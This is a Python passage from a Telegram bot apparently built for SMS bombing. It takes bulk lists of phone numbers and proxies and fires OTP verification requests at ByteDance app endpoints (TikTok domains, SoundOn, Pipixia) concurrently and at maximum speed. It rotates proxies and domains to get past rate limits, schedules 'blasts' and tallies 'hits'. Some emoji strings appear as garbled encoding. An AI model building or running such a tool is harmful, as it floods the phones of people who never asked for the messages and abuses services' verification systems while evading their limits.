async def schedule_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Schedule a bulk task for later"""
    user_id = update.effective_user.id
    numbers = user_states[user_id].get('numbers', [])
    
    if not numbers:
        await update.message.reply_text(
            "❌ <b>No numbers loaded!</b>\n\n"
            "Use /setnumbers or /uploadnumbers first.",
            parse_mode="HTML"
        )
        return
    
    if not context.args:
        await update.message.reply_text(
            "⏰ <b>Schedule Task</b>\n\n"
            "Usage: <code>/schedule HH:MM</code>\n"
            "Example: <code>/schedule 14:30</code> (2:30 PM)\n\n"
            "Time is in Pakistan timezone (PKT)",
            parse_mode="HTML"
        )
        return
    
    time_str = context.args[0]
    scheduled_time = parse_schedule_time(time_str)
    
    if not scheduled_time:
        await update.message.reply_text(
            "❌ <b>Invalid time format!</b>\n\n"
            "Use: <code>/schedule HH:MM</code>\n"
            "Example: <code>/schedule 14:30</code>",
            parse_mode="HTML"
        )
        return
    
    proxies = user_states[user_id].get('proxies', [])
    chat_id = str(update.effective_chat.id)
    
    # Capture user's current app settings at schedule time
    current_app = user_states[user_id].get('app', DEFAULT_APP)
    current_domain = user_states[user_id].get('selected_domain')
    current_tc = user_states[user_id].get('selected_tc')
    current_aid = user_states[user_id].get('selected_aid')
    current_domain_mode = user_states[user_id].get('domain_mode', 'single')
    
    schedule_id = await task_manager.create_scheduled_task(
        numbers, proxies, chat_id, scheduled_time,
        app_key=current_app, override_domain=current_domain,
        override_tc=current_tc, override_aid=current_aid,
        domain_mode=current_domain_mode
    )
    
    # Start scheduler coroutine
    asyncio.create_task(run_scheduled_task(context, schedule_id))
    
    await update.message.reply_text(
        f"⏰ <b>Task Scheduled!</b>\n\n"
        f"🆔 ID: {schedule_id}\n"
        f"📱 Numbers: {len(numbers):,}\n"
        f"🔒 Proxies: {len(proxies):,}\n"
        f"🕐 Time: {scheduled_time.strftime('%I:%M %p PKT')}\n\n"
        f"Use /cancelschedule {schedule_id} to cancel.",
        parse_mode="HTML"
    )


async def schedulesep_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Schedule a Mobile (SoundOn) /sep bulk task for later.

    Usage: /schedulesep HH:MM   (Pakistan timezone)
    """
    user_id = update.effective_user.id
    numbers = user_states[user_id].get('numbers', [])

    if not numbers:
        await update.message.reply_text(
            "âŒ <b>No numbers loaded!</b>\n\n"
            "Use /setnumbers or /uploadnumbers first.",
            parse_mode="HTML"
        )
        return

    if not context.args:
        await update.message.reply_text(
            "â° <b>Schedule Mobile (SoundOn) Task</b>\n\n"
            "Usage: <code>/schedulesep HH:MM</code>\n"
            "Example: <code>/schedulesep 14:30</code> (2:30 PM PKT)\n\n"
            "This will run /sep at the scheduled time using your saved numbers & proxies.",
            parse_mode="HTML"
        )
        return

    time_str = context.args[0]
    scheduled_time = parse_schedule_time(time_str)

    if not scheduled_time:
        await update.message.reply_text(
            "âŒ <b>Invalid time format!</b>\n\n"
            "Use: <code>/schedulesep HH:MM</code>\n"
            "Example: <code>/schedulesep 14:30</code>",
            parse_mode="HTML"
        )
        return

    proxies = user_states[user_id].get('proxies', [])
    chat_id = str(update.effective_chat.id)

    sep_domain = user_states[user_id].get('sep_domain')
    sep_tc = user_states[user_id].get('sep_tc')
    sep_aid = user_states[user_id].get('sep_aid')
    user_delay = user_states[user_id].get('delay', 0.0)

    schedule_id = await task_manager.create_scheduled_task(
        numbers, proxies, chat_id, scheduled_time,
        app_key="soundon",
    )
    # Attach /setsep overrides to the scheduled task
    sched = task_manager.get_scheduled_task(schedule_id)
    if sched:
        sched.sep_domain = sep_domain
        sched.sep_tc = sep_tc
        sched.sep_aid = sep_aid

    asyncio.create_task(run_scheduled_task(context, schedule_id))

    await update.message.reply_text(
        f"⏰ <b>Mobile (SoundOn) Task Scheduled!</b>\n\n"
        f"🆔 ID: {schedule_id}\n"
        f"📱 Numbers: {len(numbers):,}\n"
        f"🔒 Proxies: {len(proxies):,}\n"
        f"🕐 Time: {scheduled_time.strftime('%I:%M %p PKT')}\n"
        f"📲 Sender: SoundOn (aid=2960, type=3635)\n\n"
        f"Use /cancelschedule {schedule_id} to cancel.",
        parse_mode="HTML"
    )


async def scheduled_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List scheduled tasks"""
    scheduled_tasks = task_manager.get_all_scheduled_tasks()
    pending = [s for s in scheduled_tasks if s.status == "pending"]
    
    if not pending:
        await update.message.reply_text("📋 No scheduled tasks.", parse_mode="HTML")
        return
    
    msg = "⏰ <b>Scheduled Tasks:</b>\n\n"
    for task in pending[-10:]:
        msg += f"🆔 {task.schedule_id}\n"
        msg += f"   📱 Numbers: {len(task.phone_numbers):,}\n"
        msg += f"   🕐 Time: {task.scheduled_time.strftime('%I:%M %p PKT')}\n\n"
    
    await update.message.reply_text(msg, parse_mode="HTML")


async def cancelschedule_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel a scheduled task"""
    if context.args:
        schedule_id = context.args[0]
        if await task_manager.cancel_scheduled_task(schedule_id):
            await update.message.reply_text(f"✅ Scheduled task {schedule_id} cancelled.", parse_mode="HTML")
        else:
            await update.message.reply_text(f"❌ Scheduled task {schedule_id} not found.", parse_mode="HTML")
    else:
        await update.message.reply_text("Usage: /cancelschedule <schedule_id>", parse_mode="HTML")


async def setnumbers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id]['awaiting'] = 'numbers'
    user_states[user_id]['numbers_buffer'] = []
    
    await update.message.reply_text(
        "📱 <b>Set Numbers</b>\n\n"
        "Send phone numbers:\n"
        "• One per line OR comma separated\n"
        "• Send in multiple messages\n"
        "• Send /done when finished",
        parse_mode="HTML"
    )


async def setproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id]['awaiting'] = 'proxies'
    user_states[user_id]['proxies_buffer'] = []
    
    await update.message.reply_text(
        "🔒 <b>Set Proxies</b>\n\n"
        "Send proxies (one per line):\n"
        "• ip:port\n"
        "• ip:port:user:pass\n"
        "• http://user:pass@ip:port\n\n"
        "Send /done when finished",
        parse_mode="HTML"
    )


async def uploadnumbers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id]['awaiting'] = 'file_numbers'
    user_states[user_id]['numbers_buffer'] = []

    await update.message.reply_text(
        "📁 <b>Upload Numbers Files</b>\n\n"
        "Send one or more TXT/CSV files with phone numbers.\n"
        "• Numbers from every file will be added to the same buffer\n"
        "• Send /done when finished to save them all",
        parse_mode="HTML"
    )


async def uploadproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id]['awaiting'] = 'file_proxies'
    user_states[user_id]['proxies_buffer'] = []

    await update.message.reply_text(
        "📁 <b>Upload Proxies Files</b>\n\n"
        "Send one or more TXT files with proxies.\n"
        "Format: ip:port or ip:port:user:pass\n\n"
        "• Proxies from every file will be added to the same buffer\n"
        "• Send /done when finished to save them all",
        parse_mode="HTML"
    )


async def clearnumbers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id]['numbers'] = []
    user_states[user_id]['numbers_buffer'] = []
    await update.message.reply_text("✅ Numbers cleared!", parse_mode="HTML")


async def clearproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id]['proxies'] = []
    user_states[user_id]['proxies_buffer'] = []
    await update.message.reply_text("✅ Proxies cleared!", parse_mode="HTML")


async def tasks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tasks = task_manager.get_all_tasks()
    
    if not tasks:
        await update.message.reply_text("📋 No tasks.", parse_mode="HTML")
        return
    
    msg = "📋 <b>Tasks:</b>\n\n"
    for task in tasks[-10:]:
        status_emoji = {"pending": "⏳", "running": "🔄", "completed": "✅", "cancelled": "❌"}.get(task.status, "❓")
        progress = f"{task.current_index}/{len(task.phone_numbers)}"
        elapsed = time.time() - task.start_time
        speed = task.current_index / elapsed if elapsed > 0 else 0
        msg += f"{status_emoji} <b>{task.task_id}</b>\n"
        msg += f"   📊 Progress: {progress}\n"
        msg += f"   ✅ {task.success_count} | ❌ {task.fail_count}\n"
        msg += f"   🚀 Speed: {speed:.1f} req/s\n\n"
    
    await update.message.reply_text(msg, parse_mode="HTML")


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.args:
        task_id = context.args[0]
        if await task_manager.cancel_task(task_id):
            await update.message.reply_text(f"✅ Task {task_id} cancelled.", parse_mode="HTML")
        else:
            await update.message.reply_text(f"❌ Task {task_id} not found.", parse_mode="HTML")
    else:
        await update.message.reply_text("Usage: /cancel <task_id>", parse_mode="HTML")


async def zijie_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start Super/Pipixia bulk OTP task"""
    user_id = update.effective_user.id
    numbers = user_states[user_id].get('numbers', [])
    
    if not numbers:
        await update.message.reply_text(
            "❌ <b>No numbers loaded!</b>\n\n"
            "Use /setnumbers or /uploadnumbers first.",
            parse_mode="HTML"
        )
        return
    
    proxies = user_states[user_id].get('proxies', [])
    await start_super_bulk_task(update, context, numbers, proxies)


async def zijiesingle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send single Super/Pipixia OTP"""
    user_id = update.effective_user.id
    
    if context.args:
        phone = ' '.join(context.args)
        await process_single_super_otp(update, context, phone)
    else:
        user_states[user_id]['awaiting'] = 'super_single_phone'
        await update.message.reply_text(
            "🚀 <b>Super/Pipixia Single OTP</b>\n\n"
            "Usage: <code>/zijiesingle +937xxxxxxxx</code>\n"
            "Or: <code>/zijiesingle +937xxxxxxxx proxy:port</code>\n\n"
            "Type 3536 - Afghanistan numbers supported!",
            parse_mode="HTML"
        )



async def setsep_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Configure custom domain, type code and AID for Mobile (SoundOn) /sep.

    Flow: domain -> type code -> AID (interactive inline buttons).
    """
    user_id = update.effective_user.id
    keyboard = [
        [InlineKeyboardButton("soundon.global (default)", callback_data="setsep_dom|default")],
        [InlineKeyboardButton("Custom Domain", callback_data="setsep_dom|custom")],
    ]
    await update.message.reply_text(
        "<b>Configure /sep (Mobile SoundOn)</b>\n\n"
        "Step 1/3: Select domain:",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )


async def sep_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send Mobile (SoundOn) SMS via /sep using saved numbers + proxies.

    Usage:
      /sep                  -> bulk: uses saved /setnumbers + /setproxies
      /sep +9230xxxxxxxx    -> single test send (proxy auto-picked from saved)
      /sep +92xxxx ip:port  -> single test send with explicit proxy
    """
    user_id = update.effective_user.id

    if context.args:
        phone = ' '.join(context.args)
        await process_single_soundon_otp(update, context, phone)
        return

    numbers = user_states[user_id].get('numbers', [])
    if not numbers:
        await update.message.reply_text(
            "â„¹ï¸ <b>No numbers loaded!</b>\n\n"
            "Use /setnumbers or /uploadnumbers first, then run /sep to start the Mobile (SoundOn) blast.",
            parse_mode="HTML",
        )
        return

    proxies = user_states[user_id].get('proxies', [])
    sep_domain = user_states[user_id].get('sep_domain')
    sep_tc = user_states[user_id].get('sep_tc')
    sep_aid = user_states[user_id].get('sep_aid')
    user_delay = user_states[user_id].get('delay', 0.0)
    await start_soundon_bulk_task(update, context, numbers, proxies,
                                   sep_domain=sep_domain, sep_tc=sep_tc,
                                   sep_aid=sep_aid, user_delay=user_delay)



async def setdelay_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set delay between requests (seconds). Applies to /bulk, /sep, /zijie, etc.

    Usage: /setdelay 1      (1 second between each request)
           /setdelay 0.5    (half second)
           /setdelay 0      (no delay, maximum speed - default)
    """
    user_id = update.effective_user.id
    if not context.args:
        current = user_states[user_id].get('delay', 0.0)
        await update.message.reply_text(
            "<b>Set Request Delay</b>\n\n"
            f"Current delay: <code>{current}s</code>\n\n"
            "Usage: <code>/setdelay 1</code> (1 sec between each request)\n"
            "<code>/setdelay 0.5</code> (half second)\n"
            "<code>/setdelay 0</code> (no delay, max speed)\n\n"
            "This delay applies to /bulk, /sep, /zijie, /schedule, /schedulesep.",
            parse_mode="HTML",
        )
        return
    try:
        delay = float(context.args[0])
        if delay < 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("Invalid delay. Use a positive number (seconds).", parse_mode="HTML")
        return
    user_states[user_id]['delay'] = delay
    if delay == 0:
        await update.message.reply_text("Delay removed. Maximum speed.", parse_mode="HTML")
    else:
        await update.message.reply_text(f"Delay set to <code>{delay}s</code> between each request.", parse_mode="HTML")


async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    awaiting = user_states[user_id].get('awaiting')
    
    if awaiting in ('numbers', 'file_numbers'):
        numbers = list(dict.fromkeys(user_states[user_id].get('numbers_buffer', [])))
        user_states[user_id]['numbers'] = numbers
        user_states[user_id]['awaiting'] = None
        user_states[user_id]['numbers_buffer'] = []
        await update.message.reply_text(f"✅ <b>{len(numbers):,} numbers saved!</b>", parse_mode="HTML")
    
    elif awaiting in ('proxies', 'file_proxies'):
        proxies = list(dict.fromkeys(user_states[user_id].get('proxies_buffer', [])))
        user_states[user_id]['proxies'] = proxies
        user_states[user_id]['awaiting'] = None
        user_states[user_id]['proxies_buffer'] = []
        await update.message.reply_text(f"✅ <b>{len(proxies):,} proxies saved!</b>", parse_mode="HTML")
    
    else:
        await update.message.reply_text("❓ Nothing to finish.", parse_mode="HTML")


# ============================================
# CALLBACK HANDLERS
# ============================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data

    # Route /setsep callbacks
    if data.startswith("setsep_"):
        await _handle_setsep_callback(query, query.from_user.id, data)
        return

    
    if data == "bulk":
        user_id = query.from_user.id
        numbers = user_states[user_id].get('numbers', [])
        if not numbers:
            await query.edit_message_text(
                "❌ <b>No numbers loaded!</b>\n\n"
                "Use /setnumbers or /uploadnumbers first.",
                parse_mode="HTML"
            )
        else:
            proxies = user_states[user_id].get('proxies', [])
            await query.edit_message_text(f"🚀 Starting bulk task with {len(numbers):,} numbers...", parse_mode="HTML")
            await start_bulk_task_from_callback(context, query, numbers, proxies)
    
    elif data == "single":
        await query.edit_message_text(
            "📱 <b>Single OTP</b>\n\n"
            "Send: <code>/single +923099003842</code>",
            parse_mode="HTML"
        )
    
    elif data == "upload_numbers":
        user_id = query.from_user.id
        user_states[user_id]['awaiting'] = 'file_numbers'
        user_states[user_id]['numbers_buffer'] = []
        await query.edit_message_text(
            "📁 <b>Upload Numbers Files</b>\n\n"
            "Send one or more TXT/CSV files, then /done to save.",
            parse_mode="HTML"
        )
    
    elif data == "upload_proxies":
        user_id = query.from_user.id
        user_states[user_id]['awaiting'] = 'file_proxies'
        user_states[user_id]['proxies_buffer'] = []
        await query.edit_message_text(
            "📁 <b>Upload Proxies Files</b>\n\n"
            "Send one or more TXT files, then /done to save.",
            parse_mode="HTML"
        )
    
    elif data == "schedule":
        await query.edit_message_text(
            "⏰ <b>Schedule Task</b>\n\n"
            "Use: <code>/schedule HH:MM</code>\n"
            "Example: <code>/schedule 14:30</code>\n\n"
            "Time is in Pakistan timezone (PKT)",
            parse_mode="HTML"
        )
    
    elif data == "scheduled_list":
        scheduled_tasks = task_manager.get_all_scheduled_tasks()
        pending = [s for s in scheduled_tasks if s.status == "pending"]
        
        if not pending:
            await query.edit_message_text("📋 No scheduled tasks.", parse_mode="HTML")
        else:
            msg = "⏰ <b>Scheduled Tasks:</b>\n\n"
            for task in pending[-5:]:
                msg += f"🆔 {task.schedule_id}\n"
                msg += f"   📱 Numbers: {len(task.phone_numbers):,}\n"
                msg += f"   🕐 Time: {task.scheduled_time.strftime('%I:%M %p PKT')}\n\n"
            await query.edit_message_text(msg, parse_mode="HTML")
    
    elif data == "status":
        stats = identity_generator.get_stats()
        running = task_manager.get_running_count()
        pk_time = get_pakistan_time().strftime("%I:%M:%S %p")
        g_stats = global_stats.get_stats()
        
        await query.edit_message_text(
            f"📊 <b>Status</b>\n\n"
            f"🤖 Bot: Online ✅\n"
            f"📦 SignerPy: {'✅' if SIGNERPY_AVAILABLE else '❌'}\n"
            f"🕐 Time: {pk_time}\n"
            f"📋 Running: {running}\n"
            f"🔢 IDs Generated: {stats['total_generated']:,}\n\n"
            f"📈 <b>Global:</b>\n"
            f"• Requests: {g_stats['total_requests']:,}\n"
            f"• Success: {g_stats['total_success']:,}\n"
            f"• Failed: {g_stats['total_failed']:,}",
            parse_mode="HTML"
        )
    
    elif data == "tasks":
        tasks = task_manager.get_all_tasks()
        if not tasks:
            await query.edit_message_text("📋 No tasks.", parse_mode="HTML")
        else:
            msg = "📋 <b>Tasks:</b>\n\n"
            for task in tasks[-5:]:
                status_emoji = {"pending": "⏳", "running": "🔄", "completed": "✅", "cancelled": "❌"}.get(task.status, "❓")
                msg += f"{status_emoji} {task.task_id}: {task.current_index}/{len(task.phone_numbers)}\n"
            await query.edit_message_text(msg, parse_mode="HTML")
    
    elif data == "global_stats":
        g_stats = global_stats.get_stats()
        uptime_mins = g_stats['uptime_seconds'] / 60
        success_rate = (g_stats['total_success'] / g_stats['total_requests'] * 100) if g_stats['total_requests'] > 0 else 0
        
        await query.edit_message_text(
            f"📈 <b>Global Statistics</b>\n\n"
            f"🔢 Total Requests: {g_stats['total_requests']:,}\n"
            f"✅ Success: {g_stats['total_success']:,}\n"
            f"❌ Failed: {g_stats['total_failed']:,}\n"
            f"📊 Success Rate: {success_rate:.1f}%\n\n"
            f"⏱ Uptime: {uptime_mins:.1f} min\n"
            f"🚀 Req/Min: {g_stats['requests_per_minute']:.1f}",
            parse_mode="HTML"
        )

    # ---- SETAPP INLINE FLOW ----
    elif data.startswith("sa|"):
        # App selected from /setapp inline buttons
        app_key = data.split("|", 1)[1]
        user_id = query.from_user.id
        await _show_domain_buttons(query, user_id, app_key, "setapp")

    elif data.startswith("sa2|"):
        # App selected from /setapp2 inline buttons
        app_key = data.split("|", 1)[1]
        user_id = query.from_user.id
        await _show_domain_buttons(query, user_id, app_key, "setapp2")

    elif data.startswith("dom|"):
        # Domain selected
        user_id = query.from_user.id
        app_key = user_states[user_id].get('_pending_app')
        app = CONFIRMED_APPS.get(app_key) or BYTEDANCE_APPS.get(app_key)
        if not app:
            await query.edit_message_text("Error: app not found", parse_mode='HTML')
            return
        dom_val = data.split("|", 1)[1]
        if dom_val == "all":
            user_states[user_id]['_pending_selected_domain'] = None
            user_states[user_id]['_pending_domain_mode'] = 'all'
            user_states[user_id]['_pending_domain_display'] = '✅ All Domains (round-robin)'
        elif dom_val == "custom":
            user_states[user_id]['awaiting'] = 'custom_domain'
            await query.edit_message_text(
                f"<b>{app['name']} (AID={app['aid']})</b>\n\n"
                f"📝 Enter custom domain (e.g. <code>api16-normal-c-alisg.tiktokv.com</code>):",
                parse_mode='HTML')
            return
        else:
            idx = int(dom_val)
            domains = app.get("domains", [])
            if idx < len(domains):
                user_states[user_id]['_pending_selected_domain'] = domains[idx]
                user_states[user_id]['_pending_domain_mode'] = 'single'
                user_states[user_id]['_pending_domain_display'] = domains[idx]
            else:
                user_states[user_id]['_pending_selected_domain'] = None
                user_states[user_id]['_pending_domain_mode'] = 'all'
                user_states[user_id]['_pending_domain_display'] = '✅ All Domains (round-robin)'
        # Show type code selection
        await _show_tc_buttons(query, user_id)

    elif data.startswith("tc|"):
        # Type code selected
        user_id = query.from_user.id
        tc_val = data.split("|", 1)[1]
        app_key = user_states[user_id].get('_pending_app')
        app = CONFIRMED_APPS.get(app_key) or BYTEDANCE_APPS.get(app_key)
        if not app:
            await query.edit_message_text("Error: app not found", parse_mode='HTML')
            return
        if tc_val == "custom":
            user_states[user_id]['awaiting'] = 'custom_tc'
            await query.edit_message_text(
                f"<b>{app['name']}</b>\n\n📝 Enter custom type code (number):",
                parse_mode='HTML')
            return
        tc = int(tc_val)
        # Stage tc, then ask about custom AID before committing
        user_states[user_id]['_pending_selected_tc'] = tc
        user_states[user_id]['_pending_tc_custom'] = False
        await _show_aid_prompt(query, user_id)

    elif data.startswith("aid|"):
        # Custom AID Y/N answer
        user_id = query.from_user.id
        aid_val = data.split("|", 1)[1]
        app_key = user_states[user_id].get('_pending_app')
        app = CONFIRMED_APPS.get(app_key) or BYTEDANCE_APPS.get(app_key)
        if not app:
            await query.edit_message_text("Error: app not found", parse_mode='HTML')
            return
        if aid_val == "y":
            user_states[user_id]['awaiting'] = 'custom_aid'
            await query.edit_message_text(
                f"<b>{app['name']}</b>\n\n📝 Enter custom AID (number):",
                parse_mode='HTML')
            return
        # 'n' or anything else: commit with default AID
        user_states[user_id]['_pending_selected_aid'] = None
        await _commit_app_selection(query, user_id)


# ============================================
# OTP PROCESSING - ULTRA FAST
# ============================================

async def process_single_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str):
    user_id = update.effective_user.id
    proxies = user_states[user_id].get('proxies', [])
    
    # Parse proxy from command if provided
    parts = phone.split()
    phone_num = parts[0]
    proxy = parts[1] if len(parts) > 1 else None
    
    if not proxy and proxies:
        proxy = random.choice(proxies)
    
    # Use thread pool for blocking operation with user's selected app
    app_key = user_states[user_id].get('app', DEFAULT_APP)
    override_domain = user_states[user_id].get('selected_domain')
    override_tc = user_states[user_id].get('selected_tc')
    override_aid = user_states[user_id].get('selected_aid')
    loop = asyncio.get_event_loop()
    sender = ByteDanceOTPSender(identity_generator, app_key)
    result = await loop.run_in_executor(
        thread_pool, sender.send_otp_sync, phone_num, proxy, override_domain, override_tc, override_aid)
    
    await global_stats.increment(result.get("success", False))
    
    if result.get("success"):
        status = "✅ SUCCESS"
        status_detail = result.get("message", "OTP Sent")
    else:
        status = "❌ FAILED"
        error = result.get("data", {}).get("description", result.get("error", "Unknown")) if isinstance(result.get("data"), dict) else result.get("error", "Unknown")
        status_detail = str(error)[:100]
    
    time_ms = result.get("time_ms", 0)
    
    msg = f"""
{'✅' if result.get('success') else '❌'} <b>OTP Result</b>

📱 Phone: <code>{phone_num}</code>
🌐 Proxy: {(proxy or 'Direct')[:30]}
📊 Status: {status_detail}
⏱ Time: {time_ms:.2f}ms
"""
    await update.message.reply_text(msg, parse_mode="HTML")


async def start_bulk_task(update: Update, context: ContextTypes.DEFAULT_TYPE, numbers: List[str], proxies: List[str]):
    chat_id = str(update.effective_chat.id)
    user_id = update.effective_user.id
    task_id = await task_manager.create_task(numbers, proxies, chat_id)
    task = task_manager.get_task(task_id)
    task.app_key = user_states[user_id].get('app', DEFAULT_APP)
    task.override_domain = user_states[user_id].get('selected_domain')
    task.override_tc = user_states[user_id].get('selected_tc')
    task.override_aid = user_states[user_id].get('selected_aid')
    task.domain_mode = user_states[user_id].get('domain_mode', 'single')
    task.delay = user_states[user_id].get("delay", 0.0)
    task.status = "running"
    task_manager.running_tasks.add(task_id)
    
    await update.message.reply_text(
        f"🚀 <b>Task #{task_id} Started!</b>\n\n"
        f"📱 Numbers: {len(numbers):,}\n"
        f"🔒 Proxies: {len(proxies):,}\n"
        f"⚡ Concurrent: {MAX_CONCURRENT_OTP}\n\n"
        f"Use /cancel {task_id} to stop.",
        parse_mode="HTML"
    )
    
    # Run in background - non-blocking
    asyncio.create_task(run_bulk_task_concurrent(context, task))


async def start_bulk_task_from_callback(context: ContextTypes.DEFAULT_TYPE, query, numbers: List[str], proxies: List[str]):
    chat_id = str(query.message.chat_id)
    user_id = query.from_user.id
    task_id = await task_manager.create_task(numbers, proxies, chat_id)
    task = task_manager.get_task(task_id)
    task.app_key = user_states[user_id].get('app', DEFAULT_APP)
    task.override_domain = user_states[user_id].get('selected_domain')
    task.override_tc = user_states[user_id].get('selected_tc')
    task.override_aid = user_states[user_id].get('selected_aid')
    task.domain_mode = user_states[user_id].get('domain_mode', 'single')
    task.status = "running"
    task_manager.running_tasks.add(task_id)
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"🚀 <b>Task #{task_id} Started!</b>\n\n"
             f"📱 Numbers: {len(numbers):,}\n"
             f"🔒 Proxies: {len(proxies):,}\n"
             f"⚡ Concurrent: {MAX_CONCURRENT_OTP}\n\n"
             f"Use /cancel {task_id} to stop.",
        parse_mode="HTML"
    )
    
    asyncio.create_task(run_bulk_task_concurrent(context, task))


async def run_scheduled_task(context: ContextTypes.DEFAULT_TYPE, schedule_id: str):
    """Run a scheduled task at the specified time"""
    scheduled_task = task_manager.get_scheduled_task(schedule_id)
    if not scheduled_task:
        return
    
    # Wait until scheduled time
    now = get_pakistan_time()
    wait_seconds = (scheduled_task.scheduled_time - now).total_seconds()
    
    if wait_seconds > 0:
        await asyncio.sleep(wait_seconds)
    
    # Check if cancelled
    if scheduled_task.status == "cancelled":
        return
    
    scheduled_task.status = "running"
    
    # Create and run the task with user's saved app settings
    task_id = await task_manager.create_task(
        scheduled_task.phone_numbers,
        scheduled_task.proxies,
        scheduled_task.chat_id
    )
    task = task_manager.get_task(task_id)
    task.app_key = scheduled_task.app_key
    task.override_domain = scheduled_task.override_domain
    task.override_tc = scheduled_task.override_tc
    task.override_aid = getattr(scheduled_task, 'override_aid', None)
    task.domain_mode = scheduled_task.domain_mode
    task.status = "running"
    task_manager.running_tasks.add(task_id)
    
    await context.bot.send_message(
        chat_id=scheduled_task.chat_id,
        text=f"⏰ <b>Scheduled Task Starting!</b>\n\n"
             f"🆔 Schedule: {schedule_id}\n"
             f"🆔 Task: {task_id}\n"
             f"📱 Numbers: {len(scheduled_task.phone_numbers):,}\n"
             f"🔒 Proxies: {len(scheduled_task.proxies):,}",
        parse_mode="HTML"
    )
    
    is_soundon = scheduled_task.app_key == "soundon"

    if is_soundon:
        task.sep_domain = getattr(scheduled_task, 'sep_domain', None)
        task.sep_tc = getattr(scheduled_task, 'sep_tc', None)
        task.sep_aid = getattr(scheduled_task, 'sep_aid', None)
        await run_soundon_bulk_task_concurrent(context, task)
    else:
        await run_bulk_task_concurrent(context, task)
    scheduled_task.status = "completed"


async def run_bulk_task_concurrent(context: ContextTypes.DEFAULT_TYPE, task: Task):
    """Run bulk task with TRUE CONCURRENCY - 5-10 requests at once"""
    
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_OTP)
    batch_results = []
    last_log_count = 0
    
    # Process in batches for better control
    for batch_start in range(0, len(task.phone_numbers), BATCH_SIZE):
        if task.cancelled:
            break
        
        batch_end = min(batch_start + BATCH_SIZE, len(task.phone_numbers))
        batch = task.phone_numbers[batch_start:batch_end]
        
        # Create concurrent tasks for this batch with domain/tc overrides
        concurrent_tasks = []
        for i, phone in enumerate(batch):
            phone_index = batch_start + i
            override_domain = getattr(task, 'override_domain', None)
            override_tc = getattr(task, 'override_tc', None)
            override_aid = getattr(task, 'override_aid', None)
            domain_mode = getattr(task, 'domain_mode', 'single')
            # Round-robin domain distribution when "all domains" selected
            if domain_mode == 'all' and not override_domain:
                app = CONFIRMED_APPS.get(task.app_key) or BYTEDANCE_APPS.get(task.app_key)
                if app:
                    domains = app.get("domains", [])
                    if domains:
                        override_domain = domains[phone_index % len(domains)]
            concurrent_tasks.append(
                send_otp_async(phone, task.proxies, semaphore,
                              delay=getattr(task, 'delay', 0.0),
                              app_key=task.app_key,
                              override_domain=override_domain,
                              override_tc=override_tc,
                              override_aid=override_aid))
        tasks = concurrent_tasks
        
        # Execute all concurrently
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        for result in results:
            if isinstance(result, Exception):
                task.fail_count += 1
                batch_results.append({"success": False, "error": str(result)})
            else:
                if result.get("success"):
                    task.success_count += 1
                else:
                    task.fail_count += 1
                batch_results.append(result)
            
            task.current_index += 1
        
        # Log every LOG_INTERVAL requests
        if task.current_index - last_log_count >= LOG_INTERVAL:
            last_log_count = task.current_index
            elapsed = time.time() - task.start_time
            speed = task.current_index / elapsed if elapsed > 0 else 0
            
            # Get last few results for log
            recent_results = batch_results[-LOG_INTERVAL:]
            recent_success = sum(1 for r in recent_results if r.get("success"))
            recent_failed = len(recent_results) - recent_success
            
            # Global stats
            g_stats = global_stats.get_stats()
            
            progress_msg = f"""
📊 <b>Task #{task.task_id} Progress</b>

📈 Progress: {task.current_index}/{len(task.phone_numbers)}
✅ Total Success: {task.success_count}
❌ Total Failed: {task.fail_count}

📋 <b>Last {len(recent_results)} Requests:</b>
✅ Success: {recent_success} | ❌ Failed: {recent_failed}

🚀 Speed: {speed:.1f} req/s
⏱ Elapsed: {elapsed:.1f}s

📈 <b>Global Hits:</b>
• Total: {g_stats['total_requests']:,}
• Success: {g_stats['total_success']:,}
• Failed: {g_stats['total_failed']:,}
"""
            await send_message_safe(context, task.chat_id, progress_msg, parse_mode="HTML")
    
    task.status = "completed" if not task.cancelled else "cancelled"
    task_manager.running_tasks.discard(task.task_id)
    
    # Final message
    elapsed = time.time() - task.start_time
    rate = (task.success_count / len(task.phone_numbers) * 100) if task.phone_numbers else 0
    speed = len(task.phone_numbers) / elapsed if elapsed > 0 else 0
    g_stats = global_stats.get_stats()
    
    final_msg = f"""
🏁 <b>Task #{task.task_id} Complete!</b>

📊 Total: {len(task.phone_numbers)}
✅ Success: {task.success_count}
❌ Failed: {task.fail_count}
📈 Success Rate: {rate:.1f}%

⏱ Total Time: {elapsed:.1f}s
🚀 Average Speed: {speed:.1f} req/s

📈 <b>Global Hits:</b>
• Total Requests: {g_stats['total_requests']:,}
• Total Success: {g_stats['total_success']:,}
• Total Failed: {g_stats['total_failed']:,}
"""
    await send_message_safe(context, task.chat_id, final_msg, parse_mode="HTML")


# ============================================
# SUPER OTP PROCESSING FUNCTIONS
# ============================================

async def process_single_super_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str):
    """Process single Super/Pipixia OTP"""
